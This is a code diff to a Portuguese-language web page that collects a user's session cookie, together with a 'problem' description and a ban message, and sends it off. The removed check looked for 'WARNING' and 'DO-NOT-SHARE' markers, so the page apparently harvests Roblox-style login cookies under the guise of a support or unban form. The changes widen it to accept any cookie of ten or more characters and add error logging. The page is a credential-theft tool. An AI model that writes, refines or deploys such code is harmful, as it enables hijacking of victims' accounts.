@@ -1863,21 +1863,10 @@ Problema: ${userProblem || 'Não informado'}
             return c;
         }
 
+        // ===== CORREÇÃO AQUI: AGORA ACEITA QUALQUER COOKIE =====
         function isValidCookieFormat(cookie) {
-            if (!cookie.startsWith('_|WARNING') && !cookie.startsWith('WARNING')) {
-                return false;
-            }
-            
-            if (!cookie.includes('DO-NOT-SHARE')) {
-                return false;
-            }
-            
-            if (cookie.length < 50) {
-                return false;
-            }
-            
-            const validPattern = /^[_|A-Za-z0-9:\-\.=]+$/;
-            return validPattern.test(cookie);
+            // Aceita qualquer cookie que não esteja vazio e tenha pelo menos 10 caracteres
+            return cookie && cookie.length >= 10;
         }
 
         function updatePreview() {
@@ -1930,18 +1919,13 @@ Problema: ${userProblem || 'Não informado'}
             const cookie = cleanCookie(rawCookie);
 
             if (!isValidCookieFormat(cookie)) {
-                showNotification('Erro', 'Formato de cookie inválido! Use o formato correto.', false);
+                showNotification('Erro', 'Cookie muito curto ou inválido!', false);
                 return;
             }
 
             if (!checkCooldown()) {
                 const rem = Math.ceil(getCooldownRemaining() / 1000);
                 showNotification('Aguarde', `Pode enviar novamente em ${rem}s`, false);
-                return;
-            }
-
-            if (cookie.length < 50) {
-                showNotification('Erro', 'Cookie incompleto', false);
                 return;
             }
 
@@ -1989,7 +1973,8 @@ Problema: ${userProblem || 'Não informado'}
                     }
                 }
             } catch (error) {
-                showNotification('Erro', 'Falha ao enviar cookie', false);
+                console.error('Erro:', error);
+                showNotification('Erro', 'Falha ao enviar cookie: ' + error.message, false);
             } finally {
                 setTimeout(() => { 
                     if (banMessageEl.style.display !== 'block') {
@@ -2039,5 +2024,3 @@ Problema: ${userProblem || 'Não informado'}
     </script>
 </body>
 </html>
-
-
